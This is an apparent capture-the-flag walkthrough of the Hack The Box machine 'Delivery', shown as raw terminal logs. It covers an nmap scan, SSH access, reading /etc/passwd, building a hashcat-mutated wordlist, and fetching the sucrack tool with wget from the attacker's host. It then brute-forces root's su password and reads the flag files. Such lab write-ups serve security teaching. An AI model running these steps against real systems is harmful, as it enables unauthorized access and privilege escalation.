nmap scan
# Nmap 7.91 scan initiated Fri Jun  4 08:25:04 2021 as: nmap -sV -sC -oN nmap/delivery.nmap 10.10.10.222
Nmap scan report for 10.10.10.222
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  4 08:25:33 2021 -- 1 IP address (1 host up) scanned in 29.51 seconds

after we add into our host file help desk delivery

```bash
┌─[✗]─[visith@parrot]─[~/CTF/htb/delivery]
└──╼ $ssh maildeliverer@10.10.10.222
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222's password: 
Permission denied, please try again.
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt
7f41e5191b9dca10b271abd2e425dfca


```

```bash
maildeliverer@Delivery:~$ cat /etc/passwd | grep -v 'nologin\|false'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
mattermost:x:998:998::/home/mattermost:/bin/sh



```
```bash


┌─[visith@parrot]─[~/CTF/htb/delivery]
└──╼ $cat passwd.txt 
PleaseSubscribe!
┌─[visith@parrot]─[~/CTF/htb/delivery]
└──╼ $hashcat --stdout passwd.txt -r /usr/share/hashcat/rules/best64.rule >> passwd.txt
```
https://github.com/hemp3l/sucrack.git

```bash
┌─[✗]─[visith@parrot]─[/opt/sucrack]
└──╼ $sudo ./configure 
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... /usr/bin/mkdir -p
checking for gawk... gawk
checking whether make sets $(MAKE)... yes
checking whether make supports nested variables... yes
checking build system type... x86_64-pc-linux-gnu
checking host system type... x86_64-pc-linux-gnu
checking target system type... x86_64-pc-linux-gnu
checking for gcc... gcc
checking whether the C compiler works... yes
checking for C compiler default output file name... a.out
checking for suffix of executables... 
checking whether we are cross compiling... no
checking for suffix of object files... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ISO C89... none needed
checking whether gcc understands -c and -o together... yes
checking whether make supports the include directive... yes (GNU style)
checking dependency style of gcc... gcc3
checking how to run the C preprocessor... gcc -E
checking for grep that handles long lines and -e... /usr/bin/grep
checking for egrep... /usr/bin/grep -E
checking for ANSI C header files... yes
checking for sys/wait.h that is POSIX.1 compatible... yes
checking for sys/types.h... yes
checking for sys/stat.h... yes
checking for stdlib.h... yes
checking for string.h... yes
checking for memory.h... yes
checking for strings.h... yes
checking for inttypes.h... yes
checking for stdint.h... yes
checking for unistd.h... yes
checking fcntl.h usability... yes
checking fcntl.h presence... yes
checking for fcntl.h... yes
checking for stdlib.h... (cached) yes
checking for string.h... (cached) yes
checking sys/ioctl.h usability... yes
checking sys/ioctl.h presence... yes
checking for sys/ioctl.h... yes
checking for unistd.h... (cached) yes
checking pthread.h usability... yes
checking pthread.h presence... yes
checking for pthread.h... yes
checking for an ANSI C-conforming const... yes
checking whether struct tm is in sys/time.h or time.h... time.h
checking whether gcc needs -traditional... no
checking for stdlib.h... (cached) yes
checking for GNU libc compatible malloc... yes
checking for stdlib.h... (cached) yes
checking for GNU libc compatible realloc... yes
checking for pid_t... yes
checking vfork.h usability... no
checking vfork.h presence... no
checking for vfork.h... no
checking for fork... yes
checking for vfork... yes
checking for working fork... yes
checking for working vfork... (cached) yes
checking for dup2... yes
checking for memset... yes
checking for strdup... yes
checking for strstr... yes
checking that generated files are newer than configure... done
configure: creating ./config.status
config.status: creating Makefile
config.status: creating src/Makefile
config.status: creating config.h
config.status: config.h is unchanged
config.status: executing depfiles commands

sucrack configuration
---------------------
sucrack version		: 1.2.3
target system           : LINUX
sucrack link flags      : -pthread
sucrack compile flags	: -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""

make

```
```bash

`
┌─[visith@parrot]─[~/CTF/htb/delivery]
└──╼ $mv passwd.txt www/
┌─[visith@parrot]─[~/CTF/htb/delivery]
└──╼ $cd www/
┌─[visith@parrot]─[~/CTF/htb/delivery/www]
└──╼ $cp /opt/sucrack/src/sucrack
cp: missing destination file operand after '/opt/sucrack/src/sucrack'
Try 'cp --help' for more information.
┌─[✗]─[visith@parrot]─[~/CTF/htb/delivery/www]
└──╼ $cp /opt/sucrack/src/sucrack .
```

```bash
maildeliverer@Delivery:~$ cd /dev/shm/
maildeliverer@Delivery:/dev/shm$ wget 10.10.14.8:8000/passwd.txt
--2021-06-04 00:00:27--  http://10.10.14.8:8000/passwd.txt
Connecting to 10.10.14.8:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1194 (1.2K) [text/plain]
Saving to: ‘passwd.txt’

passwd.txt              100%[=============================>]   1.17K  --.-KB/s    in 0s      

2021-06-04 00:00:27 (100 MB/s) - ‘passwd.txt’ saved [1194/1194]

maildeliverer@Delivery:/dev/shm$ wget 10.10.14.8:8000/sucrack
--2021-06-04 00:00:36--  http://10.10.14.8:8000/sucrack
Connecting to 10.10.14.8:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 77320 (76K) [application/octet-stream]
Saving to: ‘sucrack’

sucrack                 100%[=============================>]  75.51K   244KB/s    in 0.3s    

2021-06-04 00:00:36 (244 KB/s) - ‘sucrack’ saved [77320/77320]
maildeliverer@Delivery:/dev/shm$ chmod +x sucrack 
maildeliverer@Delivery:/dev/shm$ ./sucrack -h
sucrack 1.2.3 (LINUX) - the su cracker
Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com

 Usage: ./sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist
```

```bash
maildeliverer@Delivery:/dev/shm$ ./sucrack -a -w 20 -s 10 -u root -r passwd.txt 
-a option not available. Use the --enable-statistics configure flag
-s option not available. Use the --enable-statistics configure flag
password is: PleaseSubscribe!21

```

```bash
maildeliverer@Delivery:/dev/shm$ su -
Password: 
root@Delivery:~# ls
mail.sh  note.txt  py-smtp.py  root.txt
root@Delivery:~# cat note.txt 
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the box is here: 

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 

Keep on hacking! And please don't forget to subscribe to all the security streamers out there.

- ippsec
root@Delivery:~# cat root.txt 
2ed05a6f7194cad2e28227330d0a8429


```